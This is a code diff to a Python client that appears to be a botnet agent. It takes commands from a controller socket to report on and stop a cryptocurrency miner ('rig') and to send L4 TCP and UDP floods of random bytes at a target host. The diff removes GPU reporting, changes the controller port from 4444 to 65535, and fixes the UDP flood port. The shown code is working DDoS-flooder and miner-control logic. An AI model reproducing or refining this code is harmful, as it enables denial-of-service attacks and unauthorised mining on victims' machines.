@@ -4,12 +4,11 @@ import socket
 import psutil
 import random
 import time
-import cv2
 import sys
 import os
 
 host = "127.0.0.1"
-port = 4444
+port = 65535
 
 cpu_count = psutil.cpu_count()
 
@@ -56,11 +55,9 @@ def client():
 
             elif data == "stat":
                 if task_exists(rig):
-                    rig_cpu_usage = psutil.cpu_percent()
-                    rig_gpu_usage = cv2.cuda.maxGpuRam()
-
-                    c.sendall(f"CPU Usage: {rig_cpu_usage}".encode())
-                    c.sendall(f"GPU Usage: {rig_gpu_usage}".encode())
+                    c.sendall("Running".encode())
+                else:
+                    c.sendall("Not Running".encode())
 
             elif data == "miner stop":
                 if task_exists(rig):
@@ -111,7 +108,7 @@ def client():
                             l4_tcp_sock.connect((l4_tcp_ip, l4_tcp_port))
                             l4_tcp_sock.send(l4_tcp_bytes)
 
-                            print(f"\033[32m[+]\033[0m L4 TCP Packet sent \033[31m->\033[0m {l4_tcp_ip}:{l4_tcp_port}")
+                            print(f"\033[32m[+]\033[0m L4 TCP Packet sent -> {l4_tcp_ip}:{l4_tcp_port}")
 
                         except Exception:
                             print("\033[31m[-]\033[0m L4 TCP Connection down!")
@@ -132,7 +129,7 @@ def client():
                 data = data.split()
 
                 l4_udp_ip = socket.gethostbyname(data[2])
-                l4_udp_port = random.randint(0, 65535)
+                l4_udp_port = 65535
                 l4_udp_bytes = random._urandom(int(data[3]))
 
                 data = " ".join(data)
